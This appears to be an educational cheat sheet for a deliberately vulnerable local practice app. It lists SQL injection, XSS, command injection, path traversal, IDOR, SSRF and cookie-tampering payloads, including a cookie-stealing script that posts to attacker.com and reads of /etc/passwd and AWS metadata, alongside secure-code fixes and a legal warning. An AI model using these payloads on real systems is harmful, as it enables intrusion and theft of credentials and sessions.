# Quick Reference: Vulnerability Exploits Cheat Sheet

## 🔴 SQL Injection

### Login Bypass
```
Username: admin' OR '1'='1
Password: anything

OR

Username: ' OR '1'='1'--
Password: (leave empty)
```

### Extract All Data
```
Search: ' OR '1'='1
Search: ' UNION SELECT username, password FROM users--
```

---

## 🔴 Cross-Site Scripting (XSS)

### Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### Steal Cookies
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

---

## 🔴 Command Injection

### Linux/Mac
```bash
127.0.0.1; ls
127.0.0.1; cat /etc/passwd
127.0.0.1; whoami
127.0.0.1 && pwd
```

### Windows
```cmd
127.0.0.1 & dir
127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
127.0.0.1 && whoami
```

---

## 🔴 Path Traversal

### Linux
```
../vulnerable_app.py
../../vulnerable_app.py
../../../etc/passwd
../../../etc/shadow
```

### Windows
```
..\vulnerable_app.py
..\..\vulnerable_app.py
..\..\..\Windows\System32\drivers\etc\hosts
```

---

## 🔴 IDOR (Insecure Direct Object Reference)

Simply change IDs in URLs:
```
/post/1  →  /post/2
/user/1  →  /user/2, /user/3
/file/1  →  /file/2
```

---

## 🔴 SSRF (Server-Side Request Forgery)

### Internal URLs
```
http://127.0.0.1:5000/debug
http://localhost:5000/config
http://192.168.1.1/admin
```

### Cloud Metadata (AWS)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
```

---

## 🔴 Session/Cookie Manipulation

### Using Browser DevTools
1. Open DevTools (F12)
2. Go to Application → Cookies
3. Edit cookie values
4. Refresh page

### Common Session Exploits
```
Set: role=admin
Set: user_id=1
Set: is_authenticated=true
```

---

## 🔓 How to Fix Each Vulnerability

### SQL Injection Fix
```python
# VULNERABLE
query = f"SELECT * FROM users WHERE username='{username}'"
c.execute(query)

# SECURE
c.execute("SELECT * FROM users WHERE username=?", (username,))
```

### XSS Fix
```python
# VULNERABLE
return f"<p>Hello {name}</p>"

# SECURE
from markupsafe import escape
return f"<p>Hello {escape(name)}</p>"

# OR use template engine
return render_template('page.html', name=name)  # Auto-escapes
```

### Command Injection Fix
```python
# VULNERABLE
subprocess.call(f"ping {host}", shell=True)

# SECURE
subprocess.call(['ping', '-c', '1', host])  # No shell=True!
```

### Path Traversal Fix
```python
# VULNERABLE
filepath = os.path.join('files', filename)

# SECURE
filename = os.path.basename(filename)  # Strip path components
filepath = os.path.join('files', filename)
# Then verify it's still in allowed directory
if not os.path.abspath(filepath).startswith(os.path.abspath('files')):
    return "Access denied"
```

### IDOR Fix
```python
# VULNERABLE
post = get_post_by_id(post_id)
return render(post)

# SECURE
post = get_post_by_id(post_id)
if post.user_id != session['user_id']:
    return "Access Denied", 403
return render(post)
```

---

## 🛠️ Testing Tools

### Browser DevTools (F12)
- Network tab: See all requests
- Console: Test XSS
- Application: View/edit cookies

### Burp Suite
- Intercept requests
- Modify parameters
- Replay attacks

### Python Script Example
```python
import requests

# Test SQL injection
r = requests.post('http://localhost:5000/login', data={
    'username': "admin' OR '1'='1",
    'password': 'x'
})
print(r.text)

# Test XSS
r = requests.post('http://localhost:5000/comment', data={
    'comment': '<script>alert("XSS")</script>'
})
print(r.text)
```

---

## 📚 Learning Path

1. **Understand** → Read about the vulnerability
2. **Exploit** → Use the app to exploit it
3. **Analyze** → Understand WHY it worked
4. **Fix** → Modify the code to fix it
5. **Verify** → Test that the fix works
6. **Repeat** → Move to next vulnerability

---

## ⚖️ Legal & Ethical

✅ Test on THIS app (your own local server)
✅ Learn on legal platforms (HTB, THM, etc.)
❌ NEVER test on real websites without permission
❌ NEVER use these for malicious purposes

**Hacking without permission is ILLEGAL and can result in criminal charges!**

---

## 🎯 Quick Wins (Start Here)

If you're new to security testing, try these in order:

1. **SQL Injection in login** - Easiest to see immediate results
2. **XSS in comment** - Fun to see JavaScript execute
3. **IDOR in user profiles** - Simple URL manipulation
4. **Path Traversal** - Read the source code!
5. **Command Injection** - See system commands execute

Then move to the more advanced ones:
- SSRF
- Deserialization
- Authentication bypass

---

Good luck! 🚀
